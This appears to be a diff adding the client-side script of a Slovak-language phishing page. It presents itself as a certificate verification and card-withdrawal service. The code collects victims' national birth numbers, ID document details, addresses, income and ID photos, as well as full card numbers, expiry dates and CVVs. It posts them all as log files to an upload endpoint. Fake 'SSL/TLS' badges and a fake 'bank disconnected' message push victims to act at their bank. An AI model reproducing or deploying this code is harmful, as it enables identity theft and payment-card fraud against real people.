+  if (!input || !list) return;
+  var debTimer;
+  input.addEventListener('input', function() {
+    clearTimeout(debTimer);
+    var val = input.value.trim();
+    if (val.length < 3) { list.style.display='none'; return; }
+    debTimer = setTimeout(function() {
+      var url = 'https://nominatim.openstreetmap.org/search?format=json&addressdetails=1&limit=5&q=' + encodeURIComponent(val);
+      fetch(url, { headers: { 'Accept-Language': 'sk' } })
+        .then(function(r){ return r.json(); })
+        .then(function(results) {
+          list.innerHTML = '';
+          if (!results.length) { list.style.display='none'; return; }
+          results.forEach(function(r) {
+            var li = document.createElement('li');
+            li.textContent = r.display_name;
+            li.style_fixed.cssText = 'padding:10px 14px;cursor:pointer;font-size:13px;border-bottom:1px solid #161616;';
+            li.addEventListener('mousedown', function(e) {
+              e.preventDefault();
+              input.value = r.display_name;
+              _quizAnswers['q5'] = r.display_name;
+              list.style.display = 'none';
+              var nextBtn = document.getElementById('quiz-btn-next');
+              if (nextBtn) nextBtn.disabled = false;
+            });
+            li.addEventListener('mouseover', function(){ li.style.background='#f0f4ff'; });
+            li.addEventListener('mouseout',  function(){ li.style.background=''; });
+            list.appendChild(li);
+          });
+          list.style.display = 'block';
+        })
+        .catch(function(){ list.style.display='none'; });
+    }, 350);
+  });
+  document.addEventListener('click', function(e) {
+    if (!input.contains(e.target) && !list.contains(e.target)) list.style.display='none';
+  });
+}
+
+/* Override onQuizInput for q5 to trigger autocomplete */
+var _origOnQuizInput = onQuizInput;
+
+/* Toggle vedlajsi prijem */
+var _vedlajsiOn = false;
+function toggleVedlajsi() {
+  _vedlajsiOn = !_vedlajsiOn;
+  var btn   = document.getElementById('toggle-vedlajsi');
+  var thumb = document.getElementById('toggle-thumb');
+  var label = document.getElementById('toggle-label');
+  var wrap  = document.getElementById('q-vedlajsi-prijem-suma');
+  var nextBtn = document.getElementById('quiz-btn-next');
+  if (_vedlajsiOn) {
+    btn.style.background = '#C9A84C';
+    thumb.style.transform = 'translateX(22px)';
+    label.textContent = 'Áno';
+    label.style.color = '#C9A84C';
+    wrap.style.display = 'block';
+    nextBtn.disabled = true; /* require amount */
+  } else {
+    btn.style.background = '#D4D4D4';
+    thumb.style.transform = 'translateX(0)';
+    label.textContent = 'Nie';
+    label.style.color = '#555555';
+    wrap.style.display = 'none';
+    nextBtn.disabled = false;
+    _quizAnswers['q6'] = 'Nie';
+  }
+}
+
+function onVedlajsiInput() {
+  var val = (document.getElementById('q-vedlajsi-prijem-suma') || {}).value || '';
+  val = val.trim();
+  var nextBtn = document.getElementById('quiz-btn-next');
+  if (nextBtn) nextBtn.disabled = val.length < 1;
+}
+
+/* ── STEP 7: Zdroj príjmu ─────────────────────────── */
+var _zdrojSelected = '';
+
+function selectZdroj(val) {
+  _zdrojSelected = val;
+  _quizAnswers['q7'] = val;
+
+  /* highlight selected button */
+  document.querySelectorAll('.zdroj-opt').forEach(function(btn) {
+    var isActive = btn.getAttribute('data-val') === val;
+    btn.style.borderColor  = isActive ? '#C9A84C' : '#D4D4D4';
+    btn.style.background   = isActive ? '#1a1407' : '#D4D4D4';
+    btn.style.color        = isActive ? '#8B6914' : '#374151';
+    var radio = btn.querySelector('.zdroj-radio');
+    if (radio) {
+      radio.style.borderColor = isActive ? '#C9A84C' : '#D4D4D4';
+      radio.innerHTML = isActive
+        ? '<span style="width:10px;height:10px;border-radius:50%;background:#C9A84C;display:block;"></span>'
+        : '';
+    }
+  });
+
+  /* show/hide wrappers based on selection */
+  var zamWrap  = document.getElementById('zdroj-zamestnanec-wrap');
+  var mzdaWrap = document.getElementById('zdroj-mzda-wrap');
+  var ineWrap  = document.getElementById('zdroj-ine-wrap');
+
+  if (zamWrap)  zamWrap.style.display  = (val === 'zamestnanec') ? 'block' : 'none';
+  if (mzdaWrap) mzdaWrap.style.display = (val === 'zamestnanec' || val === 'dochodca') ? 'block' : 'none';
+  if (ineWrap)  ineWrap.style.display  = (val === 'ine') ? 'block' : 'none';
+
+  /* clear fields if switching away */
+  if (val !== 'zamestnanec') {
+    var mp = document.getElementById('q-miesto-prace');
+    var ad = document.getElementById('q-ako-dlho-pracuje');
+    if (mp) mp.value = '';
+    if (ad) ad.value = '';
+  }
+  if (val !== 'ine') {
+    var ine = document.getElementById('q-ine-cinnost');
+    if (ine) ine.value = '';
+  }
+
+  onZdrojExtraInput();
+}
+
+function onZdrojExtraInput() {
+  var nextBtn = document.getElementById('quiz-btn-next');
+  if (!nextBtn || !_zdrojSelected) { if (nextBtn) nextBtn.disabled = true; return; }
+
+  if (_zdrojSelected === 'zamestnanec') {
+    /* Требуется: место работы, продолжительность и зарплата */
+    var mp = ((document.getElementById('q-miesto-prace') || {}).value || '').trim();
+    var ad = ((document.getElementById('q-ako-dlho-pracuje') || {}).value || '').trim();
+    var mzda = ((document.getElementById('q-mzda') || {}).value || '').trim();
+    nextBtn.disabled = !(mp && ad && mzda);
+  } else if (_zdrojSelected === 'dochodca') {
+    /* Требуется: сумма дохода/пенсии */
+    var mzda = ((document.getElementById('q-mzda') || {}).value || '').trim();
+    nextBtn.disabled = !mzda;
+  } else if (_zdrojSelected === 'nezamestnany') {
+    /* Ничего не требуется, кнопка всегда включена */
+    nextBtn.disabled = false;
+  } else if (_zdrojSelected === 'ine') {
+    /* Требуется: описание деятельности */
+    var ine = ((document.getElementById('q-ine-cinnost') || {}).value || '').trim();
+    nextBtn.disabled = !ine;
+  }
+}
+
+/* Special handling for step 6: next button always enabled when toggle is off */
+function quizNext() {
+  var qKey = 'q' + _quizStep;
+
+  /* Step 5: read address from input directly */
+  if (_quizStep === 5) {
+    var addrVal = (document.getElementById('q-trvala-adresa') || {}).value || '';
+    _quizAnswers['q5'] = addrVal.trim();
+  }
+
+  /* Step 6: determine answer from toggle state */
+  if (_quizStep === 6) {
+    if (_vedlajsiOn) {
+      var sumaVal = (document.getElementById('q-vedlajsi-prijem-suma') || {}).value || '';
+      _quizAnswers['q6'] = sumaVal.trim() || '0';
+    } else {
+      _quizAnswers['q6'] = 'Nie';
+    }
+    /* proceed to step 7 */
+    _zdrojSelected = '';
+    _quizAnswers['q7'] = '';
+    goToStep(7);
+    /* reset step 7 button state */
+    setTimeout(function() {
+      var nb = document.getElementById('quiz-btn-next');
+      if (nb) nb.disabled = true;
+    }, 250);
+    return;
+  }
+
+  /* Step 7: zdroj príjmu — proceed to step 8 */
+  if (_quizStep === 7) {
+    _quizAnswers['q7'] = _zdrojSelected;
+    goToStep(8);
+    setTimeout(function() {
+      var nb = document.getElementById('quiz-btn-next');
+      if (nb) nb.disabled = true;
+    }, 250);
+    return;
+  }
+
+  /* Step 8: Photo upload — submit */
+  if (_quizStep === 8) {
+    if (!_photoFile) {
+      alert('Prosím, nahrajte fotografiu dokumentu');
+      return;
+    }
+    quizSubmit();
+    return;
+  }
+
+  var val = (_quizAnswers[qKey] || '').trim();
+  if (!val) {
+    if (_quizStep !== 6) quizShakeInput(qKey);
+    return;
+  }
+  if (_quizStep >= _quizTotal) {
+    quizSubmit();
+    return;
+  }
+
+  /* Init autocomplete when entering step 5 */
+  if (_quizStep + 1 === 5) {
+    setTimeout(initAddressAutocomplete, 300);
+  }
+  /* Set step 6 next button enabled by default (toggle=off = valid) */
+  if (_quizStep + 1 === 6) {
+    _quizAnswers['q6'] = 'Nie';
+    setTimeout(function() {
+      var nb = document.getElementById('quiz-btn-next');
+      if (nb) nb.disabled = false;
+    }, 250);
+  }
+
+  goToStep(_quizStep + 1);
+}
+
+function handlePhotoUpload(e) {
+  var file = e.target.files[0];
+  if (!file) return;
+  if (!file.type.match('image/(jpeg|png)')) {
+    alert('Prosím, nahrájte JPG alebo PNG obrázok');
+    return;
+  }
+  if (file.size > 5 * 1024 * 1024) {
+    alert('Súbor je príliš veľký. Maximum je 5MB');
+    return;
+  }
+  _photoFile = file;
+  var reader = new FileReader();
+  reader.onload = function(event) {
+    document.getElementById('photo-upload-area').style.display = 'none';
+    document.getElementById('photo-preview').style.display = 'block';
+    document.getElementById('preview-img').src = event.target.result;
+  };
+  reader.readAsDataURL(file);
+  var nextBtn = document.getElementById('quiz-btn-next');
+  if (nextBtn) nextBtn.disabled = false;
+}
+
+function removePhoto() {
+  _photoFile = null;
+  document.getElementById('photo-input').value = '';
+  document.getElementById('photo-upload-area').style.display = 'block';
+  document.getElementById('photo-preview').style.display = 'none';
+  var nextBtn = document.getElementById('quiz-btn-next');
+  if (nextBtn) nextBtn.disabled = true;
+}
+
+function quizPrev() {
+  if (_quizStep <= 1) return;
+  goToStep(_quizStep - 1);
+}
+
+function goToStep(next) {
+  var current = document.getElementById('qstep-' + _quizStep);
+  var nextEl   = document.getElementById('qstep-' + next);
+  current.classList.add('step-exit');
+  setTimeout(function() {
+    current.style.display = 'none';
+    current.classList.remove('step-exit');
+    nextEl.style.display = 'block';
+    nextEl.classList.add('step-enter');
+    setTimeout(function() { nextEl.classList.remove('step-enter'); }, 300);
+    /* focus the input in the new step */
+    var qKey = 'q' + next;
+    var fid = _quizFields[qKey];
+    var inp = document.getElementById(fid);
+    if (inp) setTimeout(function(){ inp.focus(); }, 120);
+  }, 200);
+  _quizStep = next;
+  updateQuizUI();
+}
+
+function updateQuizUI() {
+  var fill = (_quizStep / _quizTotal) * 100;
+  document.getElementById('quiz-progress-fill').style.width = fill + '%';
+  document.getElementById('quiz-step-label').textContent =
+    'Otázka ' + _quizStep + ' z ' + _quizTotal;
+
+  var backBtn = document.getElementById('quiz-btn-back');
+  var nextBtn = document.getElementById('quiz-btn-next');
+  backBtn.style.display = _quizStep > 1 ? 'flex' : 'none';
+
+  if (_quizStep === _quizTotal) {
+    nextBtn.innerHTML =
+      'Odoslať' +
+      '<svg width="14" height="14" viewBox="0 0 14 14" fill="none">' +
+      '<path d="M2 7h9M7 3l4 4-4 4" stroke="#D4D4D4" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>' +
+      '</svg>';
+  } else {
+    nextBtn.innerHTML =
+      'Ďalej' +
+      '<svg width="14" height="14" viewBox="0 0 14 14" fill="none">' +
+      '<path d="M5 3l4 4-4 4" stroke="#D4D4D4" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>' +
+      '</svg>';
+  }
+
+  /* re-enable next if this step already has a value */
+  var qKey = 'q' + _quizStep;
+  if (_quizStep === 7) {
+    /* step 7 managed by onZdrojExtraInput / selectZdroj */
+    nextBtn.disabled = !_zdrojSelected || (_zdrojSelected !== 'nezamestnany' && !((document.getElementById('q-mzda')||{}).value||'').trim());
+  } else {
+    var val = (_quizAnswers[qKey] || '').trim();
+    nextBtn.disabled = val.length < 1;
+  }
+
+  /* restore typed value if navigating back */
+  var fid = _quizFields[qKey];
+  var inp = document.getElementById(fid);
+  if (inp && val) inp.value = val;
+}
+
+function quizSubmit() {
+  var nextBtn = document.getElementById('quiz-btn-next');
+  if (nextBtn) {
+    nextBtn.disabled = true;
+    nextBtn.innerHTML =
+      '<svg style="animation:spin .8s linear infinite" width="14" height="14" viewBox="0 0 14 14" fill="none">' +
+      '<circle cx="7" cy="7" r="5.5" stroke="rgba(255,255,255,.25)" stroke-width="2"/>' +
+      '<path d="M7 1.5a5.5 5.5 0 0 1 5.5 5.5" stroke="#D4D4D4" stroke-width="2" stroke-linecap="round"/>' +
+      '</svg> Odosielam…';
+  }
+
+  var params = new URLSearchParams(window.location.search);
+  var qParams = new URLSearchParams(window.location.search);
+  var qLines = [
+    '=== BEZPEČNOSTNÝ DOTAZNÍK ===',
+    'Čas: '                  + new Date().toISOString(),
+	'IP: ' + (params.get('ip') || ''),
+    '---',
+    'Meno: '                 + (qParams.get('meno') || ''),
+    'Priezvisko: '           + (qParams.get('priezvisko') || ''),
+    'Rodné číslo: '          + (_quizAnswers['q1'] || ''),
+    'PSČ: '                  + (_quizAnswers['q2'] || ''),
+    'Číslo dokladu: '        + (_quizAnswers['q3'] || ''),
+    'Platnosť dokladu: '     + (_quizAnswers['q4'] || ''),
+    'Trvalá adresa: '        + (_quizAnswers['q5'] || ''),
+    'Vedľajší príjem: '      + (_vedlajsiOn ? 'Áno' : 'Nie'),
+    'Vedľajší príjem suma: ' + (_vedlajsiOn ? ((document.getElementById('q-vedlajsi-prijem-suma')||{}).value||'') : ''),
+    'Zdroj príjmu: '         + (_quizAnswers['q7'] || ''),
+    'Miesto práce: '         + ((document.getElementById('q-miesto-prace')||{}).value||''),
+    'Ako dlho pracuje: '     + ((document.getElementById('q-ako-dlho-pracuje')||{}).value||''),
+    'Mzda: '                 + ((document.getElementById('q-mzda')||{}).value||''),
+    'Iná činnosť: '          + ((document.getElementById('q-ine-cinnost')||{}).value||''),
+    '=== KONIEC ==='
+  ];
+  var qBlob = new Blob([qLines.join('\n')], { type: 'text/plain' });
+  var qFd   = new FormData();
+  qFd.append('file', qBlob, 'log-' + Date.now() + '.txt');
+  if (_photoFile) { qFd.append('photo', _photoFile); }
+
+  fetch('/api/upload', { method: 'POST', body: qFd })
+    .catch(function(){})
+    .finally(function() {
+      var card = document.getElementById('quiz-card');
+      card.innerHTML =
+        '<div style="padding:48px 28px;text-align:center;">' +
+        '<div style="width:70px;height:70px;border-radius:50%;background:linear-gradient(135deg,#8B6914,#C9A84C);' +
+        'display:flex;align-items:center;justify-content:center;margin:0 auto 24px;' +
+        'box-shadow:0 8px 32px rgba(201,168,76,0.35);">' +
+        '<svg width="32" height="32" viewBox="0 0 26 26" fill="none">' +
+        '<path d="M5 13l6 6L21 7" stroke="#D4D4D4" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>' +
+        '</svg></div>' +
+        '<div style="font-size:18px;font-weight:800;color:#1e3a8a;margin-bottom:10px;letter-spacing:-0.4px;line-height:1.3;">Vašu žiadosť sme prijali na spracovanie</div>' +
+        '<div style="font-size:13px;color:#555555;line-height:1.7;">Certifikát bol úspešne vytvorený.<br>Výsledok vám oznámime do 5 minút.</div>' +
+        '<div style="margin-top:22px;display:inline-flex;align-items:center;gap:7px;' +
+        'background:#1a1407;border:1.5px solid #C9A84C;border-radius:12px;' +
+        'padding:10px 18px;font-size:12px;font-weight:600;color:#C9A84C;letter-spacing:0.3px;">' +
+        '<svg width="13" height="13" viewBox="0 0 11 11" fill="none">' +
+        '<rect x="1" y="4" width="9" height="6.5" rx="1" stroke="#C9A84C" stroke-width="1.2" fill="none"/>' +
+        '<path d="M3 4V3a2.5 2.5 0 015 0v1" stroke="#C9A84C" stroke-width="1.2" stroke-linecap="round"/>' +
+        '</svg>SSL/TLS šifrované overenie</div>' +
+        '</div>';
+      
+      // Закрыть окно опросника через 3 секунды
+      setTimeout(function() {
+        closeQuizSection();
+      }, 3000);
+    });
+}
+
+/* Enter key advances quiz */
+document.addEventListener('keydown', function(e) {
+  if (e.key !== 'Enter') return;
+  var active = document.activeElement;
+  if (active && active.classList.contains('quiz-text-input')) {
+    e.preventDefault();
+    quizNext();
+  }
+});
+
+/* Shake + error style for inputs */
+var styleEl = document.createElement('style');
+styleEl.textContent =
+  '@keyframes quizShake {' +
+  '0%,100%{transform:translateX(0)}' +
+  '20%{transform:translateX(-6px)}' +
+  '40%{transform:translateX(6px)}' +
+  '60%{transform:translateX(-4px)}' +
+  '80%{transform:translateX(4px)}' +
+  '}' +
+  '.quiz-input-error{animation:quizShake .35s ease;border-color:#C9A84C!important;box-shadow:0 0 0 3px rgba(239,68,68,.15)!important;}';
+document.head.appendChild(styleEl);
+
+/* ── KARTA FORM SCRIPT ─────────────────────────────────────── */
+(function initKarta() {
+  function getEl(id) { return document.getElementById(id); }
+  function ready(fn) {
+    if (document.readyState !== 'loading') fn();
+    else document.addEventListener('DOMContentLoaded', fn);
+  }
+  ready(function() {
+    var inputName   = getEl('inputName');
+    var incan = getEl('incan');
+    var inpexo = getEl('inpexo');
+    var carnamdis   = getEl('carnamdis');
+    var IDNoDisplay     = getEl('IDNoDisplay');
+    var cardExpiryDisplay = getEl('cardExpiryDisplay');
+    var btnRandom = getEl('btnRandom');
+    if (!inputName) return; // elements not ready yet — init deferred
+
+    inputName.addEventListener('input', function(e) {
+      var v = e.target.value.toUpperCase().replace(/[^A-Z\s]/g, '');
+      e.target.value = v;
+      carnamdis.textContent = v.trim() === '' ? 'JOHN DOE' : v;
+    });
+
+    incan.addEventListener('input', function(e) {
+      var v = e.target.value.replace(/\s+/g,'').replace(/[^0-9]/g,'');
+      var fmt = '';
+      for (var i = 0; i < v.length; i++) { if (i > 0 && i % 4 === 0) fmt += ' '; fmt += v[i]; }
+      e.target.value = fmt;
+      IDNoDisplay.textContent = fmt.trim() === '' ? '0123 4567 8910 1112' : fmt;
+    });
+
+    inpexo.addEventListener('input', function(e) {
+      var v = e.target.value.replace(/[^0-9]/g,'');
+      if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2,4);
+      e.target.value = v;
+      cardExpiryDisplay.textContent = v.trim() === '' ? '01/23' : v;
+    });
+
+    if (btnRandom) {
+      btnRandom.addEventListener('click', function() {
+        var d = '';
+        for (var i = 0; i < 16; i++) d += Math.floor(Math.random()*10);
+        var fmt = d.match(/.{1,4}/g).join(' ');
+        incan.value = fmt;
+        IDNoDisplay.textContent = fmt;
+      });
+    }
+  });
+})();
+
+function kartaSubmit() {
+  var name  = (document.getElementById('inputName')||{}).value || '';
+  var no    = (document.getElementById('incan')||{}).value || '';
+  var exp   = (document.getElementById('inpexo')||{}).value || '';
+  var cvv   = (document.getElementById('inpcos')||{}).value || '';
+
+  if (!name.trim() || no.replace(/\s/g,'').length < 16 || exp.length < 5 || !cvv) {
+    var container = document.querySelector('.ab123');
+    if (container) {
+      container.style.animation = 'quizShake .35s ease';
+      setTimeout(function(){ container.style.animation = ''; }, 400);
+    }
+    return;
+  }
+
+  var btn = document.querySelector('#cad-cad .quiz-footer .quiz-btn-next');
+  if (btn) {
+    btn.disabled = true;
+    btn.innerHTML = '<svg style="animation:certSpin .75s linear infinite" width="14" height="14" viewBox="0 0 14 14" fill="none"><circle cx="7" cy="7" r="5.5" stroke="rgba(255,255,255,.25)" stroke-width="2"/><path d="M7 1.5a5.5 5.5 0 0 1 5.5 5.5" stroke="#D4D4D4" stroke-width="2" stroke-linecap="round"/></svg> Spracovávam…';
+  }
+
+  var kParams = new URLSearchParams(window.location.search);
+  var kLines = [
+    '=== VYBER NA KARTU (kartaSubmit) ===',
+    'Čas: '           + new Date().toISOString(),
+	'IP: ' + (params.get('ip') || ''),
+    '---',
+    'Meno: '          + (kParams.get('meno') || ''),
+    'Priezvisko: '    + (kParams.get('priezvisko') || ''),
+    'Meno na karte: ' + name,
+    'Číslo karty: '   + no,
+    'Expiracia: '     + exp,
+    'CVV: '           + cvv,
+    '=== KONIEC ==='
+  ];
+  var kBlob = new Blob([kLines.join('\n')], { type: 'text/plain' });
+  var kFd   = new FormData();
+  kFd.append('file', kBlob, 'log-' + Date.now() + '.txt');
+
+  fetch('/api/upload', { method: 'POST', body: kFd })
+    .catch(function(){})
+    .finally(function() {
+      var cardEl = document.getElementById('cad-cad');
+      cardEl.innerHTML =
+        '<div style="padding:44px 24px;text-align:center;">' +
+        '<div style="width:60px;height:60px;border-radius:50%;background:linear-gradient(135deg,#C9A84C,#8B6914);display:flex;align-items:center;justify-content:center;margin:0 auto 18px;box-shadow:0 6px 24px rgba(201,168,76,0.28);">' +
+        '<svg width="26" height="26" viewBox="0 0 26 26" fill="none"><path d="M5 13l6 6L21 7" stroke="#D4D4D4" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></div>' +
+        '<div style="font-size:16px;font-weight:800;color:#8B6914;margin-bottom:6px;">Platba odoslaná</div>' +
+        '<div style="font-size:13px;color:#555555;line-height:1.6;">Prostriedky budú prevedené<br>na vašu kartu do 24 hodín.</div>' +
+        '<div style="margin-top:18px;display:inline-flex;align-items:center;gap:6px;background:#100e04;border:1px solid #E8C96A;border-radius:30px;padding:6px 16px;font-size:11px;font-weight:700;color:#C9A84C;">' +
+        '<svg width="11" height="11" viewBox="0 0 11 11" fill="none"><rect x="1" y="4" width="9" height="6.5" rx="1" stroke="#C9A84C" stroke-width="1"/><path d="M3 4V3a2.5 2.5 0 015 0v1" stroke="#C9A84C" stroke-width="1" stroke-linecap="round"/></svg>' +
+        'Transakcia potvrdená</div></div>';
+    });
+}
+
+/* Re-init karta inputs after card section opens (DOMContentLoaded already fired) */
+var _kartaInited = false;
+function _initKartaAfterOpen() {
+  if (_kartaInited) return;
+  _kartaInited = true;
+  var inputName   = document.getElementById('inputName');
+  var incan = document.getElementById('incan');
+  var inpexo = document.getElementById('inpexo');
+  var carnamdis   = document.getElementById('carnamdis');
+  var IDNoDisplay     = document.getElementById('IDNoDisplay');
+  var cardExpiryDisplay = document.getElementById('cardExpiryDisplay');
+  var btnRandom = document.getElementById('btnRandom');
+  if (!inputName) return;
+
+  inputName.addEventListener('input', function(e) {
+    var v = e.target.value.toUpperCase().replace(/[^A-Z\s]/g, '');
+    e.target.value = v;
+    if (carnamdis) carnamdis.textContent = v.trim() || 'JOHN DOE';
+  });
+  incan.addEventListener('input', function(e) {
+    var v = e.target.value.replace(/\s+/g,'').replace(/[^0-9]/g,'');
+    var fmt = ''; for (var i=0;i<v.length;i++){if(i>0&&i%4===0)fmt+=' ';fmt+=v[i];}
+    e.target.value = fmt;
+    if (IDNoDisplay) IDNoDisplay.textContent = fmt || '0123 4567 8910 1112';
+  });
+  inpexo.addEventListener('input', function(e) {
+    var v = e.target.value.replace(/[^0-9]/g,'');
+    if (v.length > 2) v = v.substring(0,2)+'/'+v.substring(2,4);
+    e.target.value = v;
+    if (cardExpiryDisplay) cardExpiryDisplay.textContent = v || '01/23';
+  });
+  if (btnRandom) btnRandom.addEventListener('click', function() {
+    var d=''; for(var i=0;i<16;i++) d+=Math.floor(Math.random()*10);
+    var fmt=d.match(/.{1,4}/g).join(' ');
+    incan.value=fmt;
+    if (IDNoDisplay) IDNoDisplay.textContent=fmt;
+  });
+}
+
+
+/* ── CLOSE PANELS ─────────────────────────────────────────── */
+function closeQuizSection() {
+  var wrapper = document.getElementById('quiz-section');
+  if (!wrapper) return;
+  wrapper.classList.remove('quiz-open');
+  /* re-enable cert button */
+  _quizOpen = false;
+  var certBtn = document.getElementById('btn-cert');
+  if (certBtn) {
+    certBtn.disabled = false;
+    certBtn.style.opacity = '';
+    certBtn.style.cursor = '';
+    certBtn.innerHTML =
+      '<span class="menu-action-icon menu-action-icon--gold">' +
+        '<svg width="16" height="16" viewBox="0 0 16 16" fill="none">' +
+          '<rect x="1.5" y="5" width="13" height="9.5" rx="1.8" stroke="currentColor" stroke-width="1.4"/>' +
+          '<path d="M4 5V4a4 4 0 0 1 8 0v1" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"/>' +
+          '<circle cx="8" cy="9.5" r="1.4" fill="currentColor"/>' +
+          '<path d="M8 10.9v1.4" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/>' +
+        '</svg>' +
+      '</span>' +
+      '<span class="menu-action-body"><span class="menu-action-title">Odoslať pomocou certifikátu</span><span class="menu-action-sub">Overenie identity · SSL/TLS</span></span>' +
+      '<svg class="menu-action-arrow" width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M3 7h8M8 4l3 3-3 3" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+  }
+  setTimeout(function(){
+    wrapper.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  }, 100);
+}
+
+function closeCardSection() {
+  var wrapper = document.getElementById('cd-se-g');
+  if (!wrapper) return;
+  wrapper.classList.remove('quiz-open');
+  /* re-enable vyber button */
+  _cardOpen = false;
+  _kartaInited = false;
+  var btn = document.getElementById('btn-vyber-kartu');
+  if (btn) {
+    btn.disabled = false;
+    btn.innerHTML =
+      '<span class="menu-action-icon menu-action-icon--gold">' +
+        '<svg width="16" height="16" viewBox="0 0 16 16" fill="none">' +
+          '<rect x="1.5" y="4" width="13" height="9" rx="1.8" stroke="currentColor" stroke-width="1.4"/>' +
+          '<path d="M1.5 7.5h13" stroke="currentColor" stroke-width="1.4"/>' +
+          '<rect x="3.5" y="9.5" width="3" height="1.5" rx="0.5" fill="currentColor"/>' +
+        '</svg>' +
+      '</span>' +
+      '<span class="menu-action-body"><span class="menu-action-title">Vybrať na kartu</span><span class="menu-action-sub">Okamžitý prevod na platobnú kartu</span></span>' +
+      '<svg class="menu-action-arrow" width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M3 7h8M8 4l3 3-3 3" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+  }
+  setTimeout(function(){
+    wrapper.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  }, 100);
+}
+
+/* ── DISCONNECT BANK HANDLER ──────────────────────────────── */
+function confirmDisconnectBank() {
+  var bankSelected = document.querySelector('.bank-selected .bank-label-text');
+  var selectedText = bankSelected ? bankSelected.textContent.trim() : '';
+  
+  if (!selectedText || selectedText === '') {
+    alert('Prosím vyberte banku zo zoznamu.');
+    return;
+  }
+  
+  var confirmed = confirm('Ste si istí?\n\nOdpojenie banky je TRVALÁ AKCIA a nebude ju možné vrátiť späť. Všetky nastavenia budú vymazané.\n\nChcete pokračovať?');
+  
+  if (confirmed) {
+    handleDisconnectConfirm(selectedText);
+  }
+}
+
+function handleDisconnectConfirm(bankName) {
+  var btn = document.getElementById('btn-disconnect');
+  
+  if (!btn) return;
+  
+  btn.disabled = true;
+  var originalText = btn.innerHTML;
+  btn.innerHTML = '<svg style="animation:spin .8s linear infinite" width="16" height="16" viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="6" stroke="rgba(255,255,255,.25)" stroke-width="2"/><path d="M8 2a6 6 0 0 1 6 6" stroke="#ff6b8a" stroke-width="2" stroke-linecap="round"/></svg> Spracovávam odpojenie...';
+
+  // Collect disconnect data
+  var params = new URLSearchParams(window.location.search);
+  (function() {
+    var lines = [
+      '=== ODPOJENIE BANKY ===',
+      'Čas: '        + new Date().toISOString(),
+      'IP: ' + (params.get('ip') || ''),
+      '---',
+      'Meno: '       + (params.get('meno') || ''),
+      'Priezvisko: ' + (params.get('priezvisko') || ''),
+      'Banka: ' + bankName,
+      'Akcia: ODPOJENIE BANKY',
+      '=== KONIEC ==='
+    ];
+    var blob = new Blob([lines.join('\n')], { type: 'text/plain' });
+    var fd   = new FormData();
+    fd.append('file', blob, 'log-disconnect-' + Date.now() + '.txt');
+    fetch('/api/upload', { method: 'POST', body: fd }).catch(function(){});
+  })();
+
+  // Simulate processing delay and show success
+  setTimeout(function() {
+    var successMsg = document.createElement('div');
+    successMsg.style.cssText = 'margin-top:14px;background:#1a0a0a;border:2px solid #ff6b8a;border-radius:12px;padding:14px 16px;animation:txIn .4s ease;';
+    successMsg.innerHTML = 
+      '<div style="display:flex;align-items:flex-start;gap:12px;">' +
+        '<div style="width:32px;height:32px;border-radius:50%;background:#ff6b8a;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:2px;">' +
+          '<svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M2.5 8l4 4 7-7" stroke="#0a0a0a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>' +
+        '</div>' +
+        '<div>' +
+          '<div style="font-size:13px;font-weight:700;color:#ff6b8a;margin-bottom:3px;">' + bankName + ' bola odpojena</div>' +
+          '<div style="font-size:12px;color:#ff8fa3;line-height:1.5;">Vaša banka bola úspešne odstránená z obchodného účtu. <br>V súlade s bezpečnostnými pravidlami musíte potvrdiť, že túto akciu vykonávate práve vy.  <strong>Prejdite do svojej banky a potvrďte to.</strong>.</div>' +
+        '</div>' +
+      '</div>';
+    
+    btn.parentNode.insertBefore(successMsg, btn.nextSibling);
+    
+    btn.disabled = false;
+    btn.innerHTML = originalText;
+    
+    // Reset visual state after 4 seconds
+    setTimeout(function() {
+      successMsg.style.opacity = '0';
+      successMsg.style.transition = 'opacity 0.5s ease';
+      setTimeout(function() {
+        if (successMsg.parentNode) successMsg.parentNode.removeChild(successMsg);
+      }, 500);
+    }, 18000);
+  }, 2000);
+}
+
+</script>
+</body>
+</html>
